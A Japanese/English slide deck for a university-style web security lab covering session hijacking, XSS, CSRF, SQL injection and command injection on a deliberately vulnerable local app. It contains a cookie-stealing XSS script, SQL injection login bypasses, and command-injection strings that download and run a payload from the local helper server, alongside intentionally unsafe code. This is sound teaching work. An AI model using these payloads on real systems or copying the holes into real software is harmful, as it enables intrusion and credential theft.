---
marp: true
theme: default
paginate: true
lang: ja
title: Web Application Security Programming
---

<!-- Slide 01 / original: Web Application Security Programming -->

# Web Application Security Programming

- Webアプリケーションの代表的な脆弱性を、ローカル環境で観察する
- 攻撃が成立する「実装上の境界」をコードで確認する
- 観察した現象を、設計・実装・運用上の対策に結びつける
- 教材リポジトリ: `https://github.com/koide55/webapp-security-programming-handson`

---

<!-- Slide 02 / original: Webサーバセキュリティ -->

# Webサーバセキュリティ

- 攻撃者がどのような入力やリクエストを使うのかを知る
- Cookie、HTML、SQL、シェルなど、文脈ごとの危険な境界を理解する
- 実験用Webアプリを使って、脆弱性と対策を往復しながら学ぶ
- 本演習は防御学習用。公開サーバや第三者サービスには使わない

---

<!-- Slide 03 / original: Webアプリの実験環境 -->

# Webアプリの実験環境

- Bottle: 軽量Webフレームワーク
- Peewee: Python向けORM
- SQLite: ローカルで使えるSQLデータベース
- 補助サーバ: XSS、CSRF、ダミーペイロードの実験用
- GitHubリポジトリから取得し、Python仮想環境またはDockerで起動する

---

<!-- Slide 04 / original: Frameworks we use here -->

# Frameworks We Use Here

- Bottle handles routing, forms, cookies, and HTTP responses.
- Peewee maps Python models to SQLite tables.
- SQLite stores users, sessions, and BBS comments in a local file.
- A helper server is used only for local XSS, CSRF, and command-injection labs.
- All experiments run on `localhost`.

---

<!-- Slide 05 / original: Ex 1: Try bottle -->

# Ex 1: Try Bottle

1. Clone the repository.
2. Install dependencies in a Python virtual environment.
3. Start the vulnerable training app.
4. Open `http://localhost:8086/hello/security`.
5. Find the route `@get("/hello/<name>")` in `app/main.py`.

Point: A URL path parameter is passed into a Python function and rendered as HTML.

---

<!-- Slide 06 / original: 演習1: bottleを試そう -->

# 演習1: Bottleを試そう

```bash
git clone https://github.com/koide55/webapp-security-programming-handson.git
cd webapp-security-programming-handson
python3 -m venv .venv
. .venv/bin/activate
python -m pip install -r requirements.txt
python app/main.py --reset-db
```

- ブラウザで `http://localhost:8086/hello/security` を開く
- `app/main.py` のルーティングと戻り値を確認する

---

<!-- Slide 07 / original: Ex 2: Try peewee and SQLite -->

# Ex 2: Try Peewee and SQLite

- `Users` and `Comments` models define database tables.
- `initialize_database()` creates the tables and inserts seed users.
- The app stores data in `app/data.db`.
- Seed accounts:
  - `koide` / `password`
  - `alice` / `alice123`
  - `bob` / `bob123`

---

<!-- Slide 08 / original: 演習2: peeweeとSQLiteを試そう -->

# 演習2: PeeweeとSQLiteを試そう

```bash
sqlite3 app/data.db
.tables
.schema users
.schema comments
select userid, username, password, cookie from users;
.quit
```

- Model定義とテーブル定義の対応を見る
- 平文パスワードが保存されていることを確認する
- 「動く実装」と「安全な実装」は違うことを確認する

---

<!-- Slide 09 / original: Ex 2 cont. -->

# Ex 2: Database Access

- Peewee query example:
  - `Users.get_or_none(Users.username == "koide")`
- SQLite direct query example:
  - `select * from users where username='koide';`
- Compare ORM-generated access and hand-written SQL.
- This difference becomes important in the SQL injection exercise.

---

<!-- Slide 10 / original: 演習2 続き -->

# 演習2: データベース操作の確認

- `Users` はユーザ、パスワード、Cookie情報を持つ
- `Comments` は掲示板コメントと投稿者を持つ
- `ForeignKeyField` により、コメントとユーザが関連づく
- 考察: DBに保存すべき情報と、保存してはいけない情報を分けて説明する

---

<!-- Slide 11 / original: Session Hijacking intro -->

# セッションハイジャックの実験環境

- HTTPはリクエスト単体では利用者を覚えていない
- ログイン状態はCookieとサーバ側の情報で管理される
- Cookieが盗まれると、本人になりすましたアクセスが成立しうる
- この章では、Cookieの役割と守り方を観察する

---

<!-- Slide 12 / original: HTTP review -->

# HTTPのおさらい

1. ブラウザがHTTPリクエストを送る
2. WebサーバがHTTPレスポンスを返す
3. ブラウザがHTMLを解釈して画面を表示する

観察するもの:

- URL
- HTTPメソッド
- フォームデータ
- Cookie
- レスポンス本文

---

<!-- Slide 13 / original: HTTP stateless -->

# HTTPはステートレス

- 1回目のリクエストと2回目のリクエストは、そのままでは別物
- ログイン後のページでも、サーバは「同じ利用者か」を判断する情報が必要
- その代表的な仕組みがCookieによるセッション管理
- セッション管理の実装ミスは、なりすましにつながる

---

<!-- Slide 14 / original: stateless and stateful example -->

# ステートレスとステートフル

- ステートレス:
  - リクエストごとに独立して処理する
  - HTTPの基本的な性質
- ステートフル:
  - 過去の状態を使って現在の処理を決める
  - ログイン状態、買い物かご、投稿者情報など
- Webアプリは、ステートレスなHTTPの上にステートフルな体験を作る

---

<!-- Slide 15 / original: HTTP Cookie session management -->

# HTTP Cookie and Session Management

- After login, the server issues a session-related cookie.
- The browser sends the cookie with later requests.
- The server uses the cookie value to find the logged-in user.
- If the cookie is predictable, stolen, or poorly protected, the session can be abused.

---

<!-- Slide 16 / original: HTTP Cookie セッション管理 -->

# Cookieで守るべきこと

- セッションIDは十分にランダムにする
- Cookieには必要に応じて属性を付ける
  - `HttpOnly`
  - `Secure`
  - `SameSite`
- サーバ側で有効期限やログアウトを管理する
- 本教材では違いを観察しやすいよう、あえて弱い実装を含める

---

<!-- Slide 17 / original: Session Hijacking -->

# Session Hijacking

- A user logs in and receives a cookie.
- An attacker obtains the cookie value.
- The attacker sends requests with the stolen cookie.
- If the server accepts it, the attacker is treated as the victim.

Key idea: Password authentication can be bypassed after the session is stolen.

---

<!-- Slide 18 / original: セッションハイジャック -->

# セッションハイジャック

- ログイン成功後のCookieは、本人性を示す重要な情報になる
- Cookieをコピーできると、別ブラウザでもログイン状態を再現できる
- 推測可能なCookie値、JavaScriptから読めるCookie、漏えい時の無対策が危険
- 演習ではブラウザ開発者ツールでCookieの扱いを観察する

---

<!-- Slide 19 / original: 実験用Webアプリケーション -->

# 実験用Webアプリケーション

最低限の機能:

- サインアップ
- ログイン、ログアウト
- マイページ
- 掲示板
- 問い合わせフォーム

教材化したコードはGitHubに配置:

`https://github.com/koide55/webapp-security-programming-handson`

---

<!-- Slide 20 / original: Code structure English -->

# Code Structure

```text
app/
  main.py          # vulnerable training app
  views/bbs.tpl   # BBS template
tools/
  attacker_server.py
docs/
  setup.md
  exercises.md
  security-notes.md
slides/
  webapp-prosecit-20250727.pdf
```

The repository includes the app, helper server, setup guide, and exercises.

---

<!-- Slide 21 / original: コードをみてみよう -->

# コードを見てみよう

- `app/main.py`
  - ルーティング、DB操作、Cookie、脆弱な処理をまとめている
- `app/views/bbs.tpl`
  - 掲示板HTMLテンプレート
- `tools/attacker_server.py`
  - XSS受信、CSRFページ、ダミーペイロード配布
- `docs/`
  - 受講者向け手順と講師向けメモ

---

<!-- Slide 22 / original: Database configuration -->

# データベース設定・接続

```python
DBFILE = BASE_DIR / "data.db"
db = SqliteDatabase(str(DBFILE))

class Users(BaseModel):
    userid = PrimaryKeyField()
    username = CharField(null=True, unique=True)
    password = CharField(null=True)
    cookie = CharField(null=True)
```

- SQLiteファイルは `app/data.db`
- `--reset-db` で初期化できる

---

<!-- Slide 23 / original: Signup -->

# サインアップ

処理の流れ:

1. フォームから `username` と `password` を受け取る
2. 空欄と重複ユーザを確認する
3. `Users.create()` でDBに保存する
4. ログイン画面へ誘導する

観察ポイント:

- 現状はパスワードを平文保存している
- 改修課題ではパスワードハッシュ化を検討する

---

<!-- Slide 24 / original: Login -->

# ログイン

この教材では、SQLインジェクション演習のために、ログイン処理を意図的に脆弱にしている。

```python
sql = "SELECT * FROM users WHERE username='" + username + \
      "' and password='" + password + "';"
records = cursor.execute(sql)
```

- 成功時はCookieを発行する
- 実行されたSQLを画面に表示し、危険な連結を観察できる

---

<!-- Slide 25 / original: Logout and my page -->

# ログアウト・マイページ

- `/logout`
  - `cookie_id` を削除する
  - ログイン画面へ戻す
- `/mypage`
  - Cookieから現在のユーザを検索する
  - 見つからない場合はログインを求める

考察:

- Cookieの値だけに頼る実装では何が危険か
- セッション失効はどこで管理すべきか

---

<!-- Slide 26 / original: Ex 3 Session Hijacking -->

# 演習3: セッションハイジャック

1. 通常ウィンドウで `koide` としてログインする
2. 別ブラウザまたはシークレットウィンドウで `alice` としてログインする
3. 開発者ツールで `cookie_id` を確認する
4. Cookieをコピーして、別ウィンドウで再読み込みする
5. 表示されるユーザがどう変わるか観察する

目的: Cookieがログイン状態を表すことを理解する

---

<!-- Slide 27 / original: Chrome developer tools -->

# ChromeでCookieを確認する

手順:

1. View
2. Developer
3. Developer Tools
4. Application
5. Storage
6. Cookies
7. `http://localhost:8086`

確認する値:

- `cookie_id`
- Cookieの属性
- ログアウト後にCookieが消えるか

---

<!-- Slide 28 / original: Ex 4 secret key -->

# 演習4: 署名付きCookieを比較する

`app/main.py` の次の指定を観察する。

```python
response.set_cookie("cookie_id", cookie_id, secret=COOKIE_SECRET)
request.get_cookie("cookie_id", secret=COOKIE_SECRET)
```

考察:

- `secret` がある場合、任意の `user1` へ単純に書き換えられるか
- `secret` を外すと何が変わるか
- `HttpOnly` や `SameSite` を付けると何が守れるか

---

<!-- Slide 29 / original: XSS intro -->

# XSSの実験環境

- 掲示板に投稿された文字列がHTMLとして表示される
- エスケープを無効にすると、投稿内のJavaScriptが実行される
- CookieをJavaScriptから読める場合、外部へ送信される危険がある
- 補助サーバで送信先をローカルに用意する

---

<!-- Slide 30 / original: BBS 1/3 -->

# BBS 1/3: ルーティング

```python
@get("/bbs")
def bbs_form():
    user = current_user()
    comments = Comments.select().order_by(Comments.commentid)
    return template("bbs", username=user.username, comments=comments)
```

- ログイン中ユーザをCookieから取得する
- DBからコメント一覧を取得する
- テンプレートにユーザ名とコメントを渡す

---

<!-- Slide 31 / original: BBS 2/3 -->

# BBS 2/3: 投稿処理

```python
@post("/bbs")
def post_bbs():
    user = current_user()
    comment = request.forms.decode().get("comment", "")
    Comments.create(user=user, comment=comment, datetime=now)
    redirect("/bbs")
```

- フォーム入力をDBへ保存する
- 入力値そのものはこの時点ではHTMLではない
- 危険になるのは「表示するときの文脈」

---

<!-- Slide 32 / original: BBS 3/3 -->

# BBS 3/3: 表示処理

```html
{{!comment.comment}}
```

- `!` はBottleテンプレートのエスケープ無効化
- ユーザ入力がHTMLとして解釈される
- XSS演習のために意図的に残している

安全な方向:

```html
{{comment.comment}}
```

---

<!-- Slide 33 / original: Cross-site scripting attack -->

# Cross-Site Scripting Attack

- The victim opens a trusted web page.
- The trusted page includes attacker-controlled script.
- The browser runs the script in the trusted page context.
- Cookies, page content, and actions may be abused.

Important: The script runs because the trusted site reflected or stored unsafe input.

---

<!-- Slide 34 / original: クロスサイトスクリプティング攻撃 -->

# クロスサイトスクリプティング攻撃

- よく使うサイトに、攻撃者が制御するスクリプトが混入する
- ブラウザはそのサイトのスクリプトとして実行してしまう
- Cookieや画面上の情報が読み取られることがある
- 原因は「入力値」ではなく「出力時の文脈処理」にある

---

<!-- Slide 35 / original: HTMLを見てみる -->

# HTMLを見てみる

掲示板の表示結果を開発者ツールで確認する。

- 普通の文字列はテキストとして表示される
- `<script>` を投稿するとタグとして解釈される
- `{{!comment.comment}}` が危険な表示を許している

考察:

- 保存時に消すべきか、表示時にエスケープすべきか
- HTML、属性、JavaScriptで必要な対策は同じか

---

<!-- Slide 36 / original: お手軽悪性サイト -->

# お手軽な補助サーバ

```bash
. .venv/bin/activate
python tools/attacker_server.py
```

- `http://localhost:8090/`
  - Cookie文字列を受信してログ表示する
- `http://localhost:8090/csrf`
  - CSRF実験ページ
- `http://localhost:8090/badscript`
  - 無害なダミーペイロード

---

<!-- Slide 37 / original: A simple malicious site -->

# A Simple Local Helper Site

- Run `tools/attacker_server.py`.
- Use `http://localhost:8090/?cookie_id=...` as the XSS destination.
- The received values are recorded in `stolen_cookies.log`.
- This helper is for local classroom experiments only.

---

<!-- Slide 38 / original: For your convenience -->

# 参考: 余分なコメントを削除する

XSS演習後、DBを直接操作して投稿を消せます。

```bash
sqlite3 app/data.db \
  "delete from comments where comment like '<script>%';"
```

またはDBを初期化します。

```bash
python app/main.py --reset-db --init-only
```

---

<!-- Slide 39 / original: Ex 5 XSS -->

# 演習5: XSS

1. Webアプリでログインし、BBSを開く
2. 補助サーバを起動する
3. 次のコメントを投稿する

```html
<script>document.location="http://localhost:8090/?cookie_id="+document.cookie</script>
```

4. `http://localhost:8090` で受信結果を見る
5. なぜCookieが読めたのか説明する

---

<!-- Slide 40 / original: Ex 6 XSS -->

# 演習6: XSSを説明する

調べて説明するもの:

- 補助サーバの役割
- SQLiteの役割
- 掲示板テンプレートの危険な箇所
- Cookie属性の役割
- 出力時エスケープの意味

まとめ方:

「原因となる実装」「観察できた現象」「対策」を表にする

---

<!-- Slide 41 / original: CSRF intro -->

# CSRFの実験環境

- ブラウザは、対象サイトへのリクエストにCookieを自動で付ける
- 別サイト上のフォームからでも、対象サイトへPOSTできる
- サーバが正当な画面からの操作か検証しないと、意図しない操作が成立する
- 掲示板投稿を例に観察する

---

<!-- Slide 42 / original: CSRF -->

# クロスサイトリクエストフォージェリ

1. 利用者が掲示板にログインしている
2. 同じブラウザで別サイトを開く
3. 別サイトが掲示板へのPOSTフォームを送る
4. ブラウザは掲示板のCookieを自動で付ける
5. 掲示板側で検証しなければ投稿される

対策: CSRFトークン、Origin/Referer検証、SameSite Cookie

---

<!-- Slide 43 / original: 悪性サイト main.py -->

# 補助サーバ: CSRFページ

`tools/attacker_server.py` の `/csrf`:

```python
@get("/csrf")
def csrf_page():
    return page("CSRF Demo", """
      <form action="http://localhost:8086/bbs" method="post">
        <input type="hidden" name="comment" value="[CSRF] ...">
        <button type="submit">実行</button>
      </form>
    """)
```

---

<!-- Slide 44 / original: views/malpage.tpl -->

# CSRFページのHTML

```html
<form action="http://localhost:8086/bbs" method="post">
  <input type="hidden" name="token" value="a73+f*&t5">
  <input type="hidden" name="comment" value="[CSRF] 悪性サイトから投稿されました">
  <button type="submit">実行</button>
</form>
```

- 固定トークンは守りにならない
- サーバ側で予測不能なトークンを検証する必要がある

---

<!-- Slide 45 / original: Ex 10 CSRF -->

# 演習10: CSRF

1. Webアプリを起動する
2. 補助サーバを起動する
3. 掲示板にログインしておく
4. 同じブラウザで `http://localhost:8090/csrf` を開く
5. ボタンを押す
6. 掲示板を確認する

考察: なぜ別サイトからの投稿なのにCookieが送信されたのか

---

<!-- Slide 46 / original: SQL injection intro -->

# SQLインジェクションの実験環境

- 安全なORM利用から、危険な文字列連結SQLへ切り替えて観察する
- ユーザ入力がSQL文の一部として解釈される
- ログイン画面で、入力値と実行SQLの関係を見る
- プレースホルダを使う改修課題につなげる

---

<!-- Slide 47 / original: 脆弱にする実装の方針 -->

# 脆弱にする実装の方針

安全な方向:

- ORMの条件式を使う
- プレースホルダを使う
- 入力値とSQL構造を分離する

演習用の危険な方向:

- SQL文字列を手で組み立てる
- ユーザ入力をそのまま連結する
- エラーや実行SQLを観察できるようにする

---

<!-- Slide 48 / original: loginを脆弱にしてみる -->

# loginを脆弱にしてみる

```python
username = request.forms.decode().get("username", "")
password = request.forms.decode().get("password", "")

sql = "SELECT * FROM users WHERE username='" + username + \
      "' and password='" + password + "';"
records = cursor.execute(sql)
```

- 入力値がSQL構文を壊せる
- `app/main.py` では演習用にこの実装を残している

---

<!-- Slide 49 / original: Ex 7 SQL injection -->

# 演習7: SQLインジェクション

ログイン画面で試す例:

| username | password |
| --- | --- |
| `koide` | `' or 'a'='a` |
| `koide' --` | `anything` |

確認するもの:

- 画面に表示された実行SQL
- 認証が成立した理由
- プレースホルダに置き換えた場合の違い

---

<!-- Slide 50 / original: command injection intro -->

# コマンドインジェクションの実験環境

- 問い合わせフォームに、意図的に危険なシェル呼び出しを入れている
- ユーザ入力がOSコマンドの一部として解釈される
- 演習では無害なファイル作成とダミーペイロードだけを扱う
- 本来は `os.system()` ではなく専用ライブラリを使う

---

<!-- Slide 51 / original: command injection diagram -->

# コマンドインジェクション

危険な流れ:

1. Webフォームに入力する
2. アプリが入力値をシェルコマンドへ連結する
3. シェルが区切り文字や引用符を解釈する
4. 予定外のコマンドが実行される

ポイント: SQLiやXSSと同じく、データがコードとして解釈される

---

<!-- Slide 52 / original: blank/code transition -->

# データとコマンドの境界

危険な文字の例:

- `"`
- `;`
- `|`
- `&`
- `#`

これらは、単なる文字列ではなく、シェルにとって構文上の意味を持つ。

対策: シェルを経由しない。引数配列で渡す。専用APIを使う。

---

<!-- Slide 53 / original: blank/code transition -->

# 安全な実装の考え方

避ける:

```python
os.system("command " + user_input)
```

選ぶ:

```python
subprocess.run(["command", user_input], shell=False)
```

さらに良い:

- メール送信には `smtplib`
- ファイル操作には `pathlib`
- DB操作にはプレースホルダやORM

---

<!-- Slide 54 / original: 脆弱なメール送信機能 -->

# 脆弱な問い合わせ機能

```python
command = f'/bin/echo "From: {address}\n{comment}" >> "{OUTBOX_FILE}"'
exit_code = os.system(command)
```

- `comment` がシェルに解釈される
- 本来はメール送信ライブラリやファイルAPIを使うべき
- 教材では実行コマンドを画面に表示し、境界の破れを観察する

---

<!-- Slide 55 / original: 悪性サイトにマルウェア配布機能を追加 -->

# ダミーペイロード配布

補助サーバの `/badscript`:

```python
Path("badscript_ran.txt").write_text(
    "dummy payload executed\n",
    encoding="utf-8",
)
```

- 実害のないファイル作成だけを行う
- コマンドインジェクションの「ダウンロードして実行」の流れを安全に観察する

---

<!-- Slide 56 / original: 攻撃準備が整っているかの確認 -->

# 準備確認

確認するURL:

- Webアプリ: `http://localhost:8086`
- 補助サーバ: `http://localhost:8090`
- ダミーペイロード: `http://localhost:8090/badscript`

確認するファイル:

- `app/data.db`
- `app/mail_outbox.txt`
- `stolen_cookies.log`
- `badscript_ran.txt`

---

<!-- Slide 57 / original: ダウンロードして実行 -->

# コマンドインジェクションを観察する

問い合わせフォームのコメント欄に入力する例:

```text
"; /bin/echo injected > command_injection_result.txt; #
```

補助サーバを使う例:

```text
"; curl -s http://localhost:8090/badscript -o downloaded_badscript.py; python3 downloaded_badscript.py; #
```

ローカル演習以外では実行しない。

---

<!-- Slide 58 / original: command injection review -->

# コマンドインジェクションの対策

- そもそもシェルを呼ばない
- 文字列連結でコマンドを作らない
- `shell=False` と引数配列を使う
- 入力値をコマンド構文として扱わない
- 実行権限とファイル権限を最小にする
- ログに実行内容を残し、異常を検知する

---

<!-- Slide 59 / original: Ex 12 command injection -->

# 演習12: コマンドインジェクション

1. Webアプリにログインする
2. `/contact` を開く
3. 無害なファイル作成例を試す
4. 画面に表示された実行コマンドを読む
5. `os.system()` を使わない実装へ改修する

考察:

- どの文字がシェル構文として解釈されたか
- どこで入力値とコマンドを分離すべきか

---

<!-- Slide 60 / original: Webアプリケーションをかっこよくしよう -->

# Webアプリケーションを使いやすくしよう

- セキュリティ演習でも、使いやすいUIは重要
- 入力欄、エラー表示、導線が整理されると、観察もしやすくなる
- デザイン改善は、セキュリティ改善と矛盾しない
- 最後に、テンプレート分離とBootstrap適用を発展課題にする

---

<!-- Slide 61 / original: 見た目も大事 -->

# Webアプリの見た目も大事

- ユーザ体験が悪いと、誤操作や設定ミスが増える
- 画面の役割が明確だと、ログイン状態やエラーに気づきやすい
- フロントエンドとバックエンドを分けると、保守しやすい
- UI改善では、アクセシビリティとセキュリティ表示も意識する

---

<!-- Slide 62 / original: Directory layout -->

# ディレクトリ配置

現在の教材:

```text
app/
  main.py
  views/
    bbs.tpl
tools/
  attacker_server.py
docs/
  setup.md
  exercises.md
```

発展課題では、`views/base.html` や `static/css/` を追加して画面を整理する。

---

<!-- Slide 63 / original: main01.py -->

# 発展: main.pyを整理する

整理の方向:

- HTML文字列をPythonコードから分離する
- 共通レイアウトをテンプレート化する
- エラー表示を共通化する
- セキュリティ対策を小さく実装して確認する

例:

- `render_page()` をテンプレートへ移す
- ログイン、登録、問い合わせのHTMLを `views/` に分ける

---

<!-- Slide 64 / original: base.html -->

# 発展: base.html

共通テンプレートに含めるもの:

- 文字コードとviewport
- 共通ナビゲーション
- エラー・成功メッセージの表示領域
- CSS読み込み
- Cookieやログイン状態を誤解させない表示

目的:

- 各ページのHTML重複を減らす
- UI変更とロジック変更を分ける

---

<!-- Slide 65 / original: login.html -->

# 発展: login.html

ログイン画面で整えるもの:

- `username` と `password` のラベル
- 入力エラーの表示
- 成功後の遷移
- 実験用に表示するSQLの扱い

改修課題:

- プレースホルダを使った安全なSQLへ変更する
- パスワードハッシュを導入する
- Cookie属性を追加する

---

<!-- Slide 66 / original: Bootstrap exercise -->

# 演習13: UI改善と安全化

1. `views/` と `static/` を整理する
2. 共通テンプレートを作る
3. BootstrapまたはシンプルなCSSを適用する
4. SQLi、XSS、CSRF、コマンドインジェクションの対策を1つずつ入れる
5. 攻撃が通らなくなったことを確認する
6. 「原因、現象、対策」をレポートにまとめる

最終目標: 動くアプリから、安全に説明できる教材へ育てる
